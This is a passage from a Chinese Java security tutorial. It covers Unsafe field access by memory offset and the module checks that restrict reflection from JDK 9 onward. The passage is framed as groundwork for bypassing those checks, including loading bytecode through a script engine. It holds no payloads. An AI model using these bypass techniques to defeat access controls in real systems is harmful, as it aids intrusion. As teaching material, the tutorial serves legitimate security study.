  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p><code>Unsafe</code> 类主要是通过 JVM 内部的 <strong>native（本地方法）</strong> 来实现的上述功能，并没有用到反射技术。但是这个类在操作类的方面与反射功能上有重合之处，并且可以帮助反射绕过一些高版本 JDK 的限制，因此放在这里介绍并且只介绍与字段操作有关的内容。</p>

    </div>
  </div>

<h3 id="获取-Unsafe-实例"><a href="#获取-Unsafe-实例" class="headerlink" title="获取 Unsafe 实例"></a>获取 Unsafe 实例</h3><p><code>Unsafe</code> 的构造器是私有的，且 <code>theUnsafe</code> 字段是私有的，需要通过反射获取。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>从 Java 9 开始，<code>Unsafe</code> 受到更严格的模块限制，需添加启动参数：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/sun.misc=ALL-UNNAMED</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h3 id="获取字段的内存偏移量"><a href="#获取字段的内存偏移量" class="headerlink" title="获取字段的内存偏移量"></a>获取字段的内存偏移量</h3><p>由于 <code>Unsafe</code> 是在内存层面对象的字段，因此 <code>Unsafe</code> 在操作指定字段之前需要先获取字段的偏移量。<code>Unsafe</code> 提供了两种方法来分别获取获取普通对象和静态字段的偏移量：</p>
<ul>
<li><strong><code>objectFieldOffset(Field field)</code></strong> ：用于获取普通对象字段的偏移量。</li>
<li><strong><code>staticFieldOffset(Field field)</code></strong> ：用于获取静态字段的偏移量。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>获取字段的内存偏移量需要我们反射获取字段对应 <code>Field</code> 对象，这也意味着如果我们能够获取到字段对应的 <code>Field</code> 对象那么我们就可以绕过反射的所有限制。因此高版本反射绕过本质上就是围绕如何获取 <code>Field</code> 对象展开的。</p>
<p>另外如果我们能获取到字段对应的 <code>Field</code> 对象，那么我们同样也可以借助修改 final 变量的思路达到相同效果。</p>

    </div>
  </div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 Unsafe 实例</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 普通字段</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">ageField</span> <span class="operator">=</span> User.class.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line"><span class="type">long</span> <span class="variable">ageOffset</span> <span class="operator">=</span> unsafe.objectFieldOffset(ageField);</span><br><span class="line">System.out.println(<span class="string">&quot;Age Offset: &quot;</span> + ageOffset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 静态字段</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> User.class.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="type">long</span> <span class="variable">nameOffset</span> <span class="operator">=</span> unsafe.staticFieldOffset(nameField);</span><br><span class="line">System.out.println(<span class="string">&quot;Name Offset: &quot;</span> + nameOffset);</span><br></pre></td></tr></table></figure></div>

<h3 id="对象字段的读写"><a href="#对象字段的读写" class="headerlink" title="对象字段的读写"></a>对象字段的读写</h3><p><code>Unsafe</code> 提供了多种字段操作方法，涵盖所有 Java 基础类型和对象类型：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>getObject(Object obj, long offset)</code></td>
<td>读取对象类型字段</td>
</tr>
<tr>
<td><code>getInt(Object obj, long offset)</code></td>
<td>读取 <code>int</code> 类型字段</td>
</tr>
<tr>
<td><code>getLong(Object obj, long offset)</code></td>
<td>读取 <code>long</code> 类型字段</td>
</tr>
<tr>
<td><code>getDouble(Object obj, long offset)</code></td>
<td>读取 <code>double</code> 类型字段</td>
</tr>
<tr>
<td><code>getFloat(Object obj, long offset)</code></td>
<td>读取 <code>float</code> 类型字段</td>
</tr>
<tr>
<td><code>getBoolean(Object obj, long offset)</code></td>
<td>读取 <code>boolean</code> 类型字段</td>
</tr>
<tr>
<td><code>getByte(Object obj, long offset)</code></td>
<td>读取 <code>byte</code> 类型字段</td>
</tr>
<tr>
<td><code>getShort(Object obj, long offset)</code></td>
<td>读取 <code>short</code> 类型字段</td>
</tr>
<tr>
<td><code>getChar(Object obj, long offset)</code></td>
<td>读取 <code>char</code> 类型字段</td>
</tr>
<tr>
<td><code>putObject(Object obj, long offset, Object value)</code></td>
<td>写入对象类型字段</td>
</tr>
<tr>
<td><code>putInt(Object obj, long offset, int value)</code></td>
<td>写入 <code>int</code> 类型字段</td>
</tr>
<tr>
<td><code>putLong(Object obj, long offset, long value)</code></td>
<td>写入 <code>long</code> 类型字段</td>
</tr>
<tr>
<td><code>putDouble(Object obj, long offset, double value)</code></td>
<td>写入 <code>double</code> 类型字段</td>
</tr>
<tr>
<td><code>putFloat(Object obj, long offset, float value)</code></td>
<td>写入 <code>float</code> 类型字段</td>
</tr>
<tr>
<td><code>putBoolean(Object obj, long offset, boolean value)</code></td>
<td>写入 <code>boolean</code> 类型字段</td>
</tr>
<tr>
<td><code>putByte(Object obj, long offset, byte value)</code></td>
<td>写入 <code>byte</code> 类型字段</td>
</tr>
<tr>
<td><code>putShort(Object obj, long offset, short value)</code></td>
<td>写入 <code>short</code> 类型字段</td>
</tr>
<tr>
<td><code>putChar(Object obj, long offset, char value)</code></td>
<td>写入 <code>char</code> 类型字段</td>
</tr>
</tbody></table>
<p>这些方法的使用示例如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unsafe.putInt(user, offset, <span class="number">30</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> unsafe.getInt(user, offset);</span><br><span class="line"></span><br><span class="line">unsafe.putObject(user, offset, <span class="string">&quot;Bob&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">name</span> <span class="operator">=</span> unsafe.getObject(user, offset);</span><br></pre></td></tr></table></figure></div>

<p>在读写字段的时候我们需要向方法中传入字段所在的对象引用。对于于静态字段，静态字段存储在<strong>类的元数据区域</strong>（即<strong>方法区</strong>或<strong>元空间</strong>）中，而不是某个对象实例中，但 <code>Unsafe</code> 操作时，仍然要求传入“对象引用”，这个引用其实是<strong>类的内部静态基地址</strong>。这个地址可以通过 <code>Unsafe.staticFieldBase(Field field)</code> 方法获取。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">staticBase</span> <span class="operator">=</span> unsafe.staticFieldBase(field);</span><br><span class="line"><span class="type">long</span> <span class="variable">staticOffset</span> <span class="operator">=</span> unsafe.staticFieldOffset(field);</span><br><span class="line"></span><br><span class="line">unsafe.putObject(staticBase, staticOffset, <span class="string">&quot;NewValue&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> unsafe.getObject(staticBase, staticOffset);</span><br></pre></td></tr></table></figure></div>

<p>对于数组类型的对象，如果我们要修改其中的成员还需要先调用 <code>arrayBaseOffset</code> 和 <code>arrayIndexScale</code> 方法分别获取数组起始的偏移量和元素大小。然后根据这些信息计算要修改的数组成员的偏移量。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] data = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">baseOffset</span> <span class="operator">=</span> unsafe.arrayBaseOffset(data.getClass()); <span class="comment">// 数组起始偏移量</span></span><br><span class="line"><span class="type">int</span> <span class="variable">indexScale</span> <span class="operator">=</span> unsafe.arrayIndexScale(data.getClass()); <span class="comment">// 元素大小</span></span><br><span class="line"><span class="type">long</span> <span class="variable">offset</span> <span class="operator">=</span> baseOffset + indexScale * <span class="number">1</span>;</span><br><span class="line">unsafe.putInt(data, offset, <span class="number">100</span>); <span class="comment">// 更新数组第二个元素</span></span><br><span class="line"><span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> unsafe.getInt(data, offset); <span class="comment">// 读取</span></span><br></pre></td></tr></table></figure></div>

<h2 id="高版本-JDK-反射绕过"><a href="#高版本-JDK-反射绕过" class="headerlink" title="高版本 JDK 反射绕过"></a>高版本 JDK 反射绕过</h2><p>高版本 JDK 对于反射的限制主要有以下两个方面：</p>
<ul>
<li>限制 <code>setAccessible</code> 导致无法操作获取的被反射对象的成员。</li>
<li>过滤 <code>getDeclaredFields</code> 获取的字段导致部分字段无法通过反射获取。</li>
</ul>
<p>反射的限制以及绕过方法之间的关系如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/Reflection_bypass.svg"
                      alt="Reflection_bypass"
                ></p>
<h3 id="9≤JDK"><a href="#9≤JDK" class="headerlink" title="9≤JDK&lt;12"></a>9≤JDK&lt;12</h3><p>JDK9 开始针对 <code>checkCanSetAccessible</code> 出现一些限制。</p>
<h4 id="模块化系统"><a href="#模块化系统" class="headerlink" title="模块化系统"></a>模块化系统</h4><p>从 JDK9 开始 Java 引入了<strong>模块化系统（Project Jigsaw）</strong>的概念。</p>
<p>模块化系统（<strong>Project Jigsaw</strong>）是 Java 平台的重要特性之一，旨在改善大型 Java 应用程序的可维护性、可扩展性、性能和安全性。模块化系统将 JDK 本身分解为多个模块，并为开发者提供了一种新的方式来组织、打包和管理 Java 应用。</p>
<p>模块是通过 <code>module-info.java</code> 文件进行声明的，它包含以下几个主要内容：</p>
<ul>
<li><strong>模块名称</strong> ：模块的唯一标识。</li>
<li><strong>导出包（exports）</strong> ：指定哪些包对外部可见。只有通过 <code>exports</code> 声明的包才能被其他模块访问。</li>
<li><strong>需要的模块（requires）</strong> ：声明当前模块依赖的其他模块。如果当前模块依赖某个模块，它就可以访问该模块公开的 <code>exports</code> 包。</li>
<li><strong>开放包（opens）</strong> ：与 <code>exports</code> 类似，但允许通过反射机制访问包中的类和成员。</li>
</ul>
<p><strong><code>module-info.java</code> 示例</strong>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> com.example.myapp &#123;</span><br><span class="line">    <span class="keyword">exports</span> com.example.myapp.api;       <span class="comment">// 导出 com.example.myapp.api 包</span></span><br><span class="line">    <span class="keyword">requires</span> java.sql;                  <span class="comment">// 依赖 java.sql 模块</span></span><br><span class="line">    opens com.example.myapp.internal;    <span class="comment">// 允许通过反射访问内部包</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>模块声明一般位于每个模块的根目录下，并且必须命名为 <code>module-info.java</code>。</p>
<p>模块化系统这一机制在一定程度上限制了我们反射操作对象的属性。</p>
<h4 id="限制条件分析"><a href="#限制条件分析" class="headerlink" title="限制条件分析"></a>限制条件分析</h4><p>我们在 JDK9 版本通过反射调用 <code>java.lang.Runtime</code> 的私有构造函数时依然可以成功调用，但是会出现如下警告：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WARNING: An illegal reflective access operation has occurred</span><br><span class="line">WARNING: Illegal reflective access by com.example.Main (file:/path/to/classes/) to constructor java.lang.Runtime()</span><br><span class="line">WARNING: Please consider reporting this to the maintainers of com.example.Main</span><br><span class="line">WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations</span><br><span class="line">WARNING: All illegal access operations will be denied in a future release</span><br></pre></td></tr></table></figure></div>

<p>然而通过 JS 引擎动态加载字节码则会有如下报错，这个报错是因为 <code>java.base</code> 模块并没有开放 <code>java.lang</code> 包给 <code>jdk.scripting.nashorn.scripts</code> 模块。也就是说  JDK9 引入了的模块化系统阻止了这一操作。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(byte[],int,int) throws java.lang.ClassFormatError accessible: module java.base does not &quot;opens java.lang&quot; to module jdk.scripting.nashorn.scripts</span><br><span class="line">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:337)</span><br><span class="line">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:281)</span><br><span class="line">	at java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:198)</span><br><span class="line">	at java.base/java.lang.reflect.Method.setAccessible(Method.java:192)</span><br><span class="line">	at jdk.scripting.nashorn.scripts/jdk.nashorn.internal.scripts.Script$Recompilation$8$\^eval\_$cu1$restOf.:program(&lt;eval&gt;:1)</span><br><span class="line">	at jdk.scripting.nashorn/jdk.nashorn.internal.runtime.ScriptFunctionData.invoke(ScriptFunctionData.java:652)</span><br><span class="line">	at jdk.scripting.nashorn/jdk.nashorn.internal.runtime.ScriptFunction.invoke(ScriptFunction.java:513)</span><br><span class="line">	at jdk.scripting.nashorn/jdk.nashorn.internal.runtime.ScriptRuntime.apply(ScriptRuntime.java:517)</span><br><span class="line">	at jdk.scripting.nashorn/jdk.nashorn.api.scripting.NashornScriptEngine.evalImpl(NashornScriptEngine.java:448)</span><br><span class="line">	at jdk.scripting.nashorn/jdk.nashorn.api.scripting.NashornScriptEngine.evalImpl(NashornScriptEngine.java:405)</span><br><span class="line">	at jdk.scripting.nashorn/jdk.nashorn.api.scripting.NashornScriptEngine.evalImpl(NashornScriptEngine.java:401)</span><br><span class="line">	at jdk.scripting.nashorn/jdk.nashorn.api.scripting.NashornScriptEngine.eval(NashornScriptEngine.java:154)</span><br><span class="line">	at java.scripting/javax.script.AbstractScriptEngine.eval(AbstractScriptEngine.java:264)</span><br><span class="line">	at com.example.Main.main(Main.java:69)</span><br></pre></td></tr></table></figure></div>

<p>具体分析报错信息可以看到，抛出 <code>InaccessibleObjectException</code> 异常的位置是 <code>java.lang.reflect.AccessibleObject</code> 的 <code>checkCanSetAccessible</code> 函数。并且触发异常的用户代码是 <code>setAccessible</code> 方法的调用。</p>
<p><code>java.lang.reflect.Method</code> 继承自 <code>java.lang.reflect.Executable</code>，<code>Executable</code> 和 <code>java.lang.reflect.Field</code> 均继承自 <code>java.lang.reflect.AccessibleObject</code>。也就是说通过反射无论是调用函数还是访问属性，这些行为都会受到 <code>AccessibleObject</code> 的 <code>checkCanSetAccessible</code> 方法的监控。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/AccessibleObject.png"
                      alt="AccessibleObject"
                ></p>
<p>在 <code>setAccessible</code> 函数中如果传入的参数 <code>flag</code> 为 <code>true</code> 则会调用 <code>checkCanSetAccessible</code> 检查<strong>调用者</strong>是否有权限修改<strong>当前被反射类的属性</strong>的访问权限。其中：</p>
<ul>
<li><code>caller</code> 即通过 <code>Reflection.getCallerClass()</code> 获取的<strong>调用者的类</strong>对应的 <code>Class</code> 对象。</li>
<li><code>declaringClass</code> 即当前<strong>被反射的类</strong>对应的 <code>Class</code> 对象（通过调试得出）。</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">checkCanSetAccessible</span><span class="params">(Class&lt;?&gt; caller, Class&lt;?&gt; declaringClass)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用checkCanSetAccessible方法并传递给定的caller和declaringClass，第三个参数默认为true</span></span><br><span class="line">    checkCanSetAccessible(caller, declaringClass, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span> </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">checkCanSetAccessible</span><span class="params">(Class&lt;?&gt; caller)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用checkCanSetAccessible方法，并传入当前类的被反射类clazz作为declaringClass参数</span></span><br><span class="line">    checkCanSetAccessible(caller, clazz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 设置访问权限，允许或禁止访问当前的字段、方法或构造函数。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InaccessibleObjectException 如果调用者没有权限访问该对象，抛出此异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException 如果发生安全错误，抛出此异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(<span class="type">boolean</span> flag)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查调用该方法的权限</span></span><br><span class="line">    AccessibleObject.checkPermission();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果flag为true，检查当前调用者是否具有设置访问权限的权限</span></span><br><span class="line">    <span class="keyword">if</span> (flag) checkCanSetAccessible(Reflection.getCallerClass());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用setAccessible0设置实际的访问权限</span></span><br><span class="line">    setAccessible0(flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最终的核心函数 <code>AccessibleObject#checkCanSetAccessible</code> 用于检测成员是否可以被设置为可访问。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkCanSetAccessible</span><span class="params">(Class&lt;?&gt; caller,</span></span><br><span class="line"><span class="params">                                      Class&lt;?&gt; declaringClass,</span></span><br><span class="line"><span class="params">                                      <span class="type">boolean</span> throwExceptionIfDenied)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取调用者模块和被反射类的模块</span></span><br><span class="line">    <span class="type">Module</span> <span class="variable">callerModule</span> <span class="operator">=</span> caller.getModule();</span><br><span class="line">    <span class="type">Module</span> <span class="variable">declaringModule</span> <span class="operator">=</span> declaringClass.getModule();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果调用者和被反射类在同一模块内，返回 true</span></span><br><span class="line">    <span class="keyword">if</span> (callerModule == declaringModule) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 如果调用者模块是 Object 类所在的模块，返回 true</span></span><br><span class="line">    <span class="keyword">if</span> (callerModule == Object.class.getModule()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 如果被反射类的模块未命名，返回 true</span></span><br><span class="line">    <span class="keyword">if</span> (!declaringModule.isNamed()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取被反射类的包名</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">pn</span> <span class="operator">=</span> declaringClass.getPackageName();</span><br><span class="line">    <span class="type">int</span> modifiers;</span><br><span class="line">    <span class="comment">// 判断当前对象是 Field 还是 Executable 类型，获取修饰符</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span> <span class="keyword">instanceof</span> Executable) &#123;</span><br><span class="line">        modifiers = ((Executable) <span class="built_in">this</span>).getModifiers();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        modifiers = ((Field) <span class="built_in">this</span>).getModifiers();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断被反射类是否为公共类，且包是否允许调用者访问</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isClassPublic</span> <span class="operator">=</span> Modifier.isPublic(declaringClass.getModifiers());</span><br><span class="line">    <span class="keyword">if</span> (isClassPublic &amp;&amp; declaringModule.isExported(pn, callerModule)) &#123;</span><br><span class="line">        <span class="comment">// 如果成员是公共的，直接返回 true</span></span><br><span class="line">        <span class="keyword">if</span> (Modifier.isPublic(modifiers)) &#123;</span><br><span class="line">            logIfExportedForIllegalAccess(caller, declaringClass);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果成员是受保护的静态的，且调用者是被反射类的子类，返回 true</span></span><br><span class="line">        <span class="keyword">if</span> (Modifier.isProtected(modifiers)</span><br><span class="line">            &amp;&amp; Modifier.isStatic(modifiers)</span><br><span class="line">            &amp;&amp; isSubclassOf(caller, declaringClass)) &#123;</span><br><span class="line">            logIfExportedForIllegalAccess(caller, declaringClass);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果被反射类的包是对调用者开放的，返回 true</span></span><br><span class="line">    <span class="keyword">if</span> (declaringModule.isOpen(pn, callerModule)) &#123;</span><br><span class="line">        logIfOpenedForIllegalAccess(caller, declaringClass);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果不允许访问并且需要抛出异常，则抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (throwExceptionIfDenied) &#123;</span><br><span class="line">        <span class="comment">// 不可访问的情况</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to make &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> <span class="keyword">instanceof</span> Field)</span><br><span class="line">            msg += <span class="string">&quot;field &quot;</span>;</span><br><span class="line">        msg += <span class="built_in">this</span> + <span class="string">&quot; accessible: &quot;</span> + declaringModule + <span class="string">&quot; does not \&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (isClassPublic &amp;&amp; Modifier.isPublic(modifiers))</span><br><span class="line">            msg += <span class="string">&quot;exports&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            msg += <span class="string">&quot;opens&quot;</span>;</span><br><span class="line">        msg += <span class="string">&quot; &quot;</span> + pn + <span class="string">&quot;\&quot; to &quot;</span> + callerModule;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建 InaccessibleObjectException 异常并打印堆栈信息</span></span><br><span class="line">        <span class="type">InaccessibleObjectException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InaccessibleObjectException</span>(msg);</span><br><span class="line">        <span class="keyword">if</span> (printStackTraceWhenAccessFails()) &#123;</span><br><span class="line">            e.printStackTrace(System.err);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总的来说，调用者为了能够获取被反射类的属性访问权限，必须满足以下至少一个条件：</p>
<ul>
<li>调用者和被反射类在同一个模块。</li>
<li>调用者属于 <code>Object</code> 模块。</li>
<li>被反射类的模块没有名称。</li>
<li>被反射类满足以下所有条件：<ul>
<li>被反射类是公共类。</li>
<li>被反射类的包导出到调用者模块。</li>
<li>访问成员是公共的或者访问成员是受保护的静态的，且调用者是被反射类的子类。</li>
</ul>
</li>
<li>被反射类的包对调用者模块是开放的。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
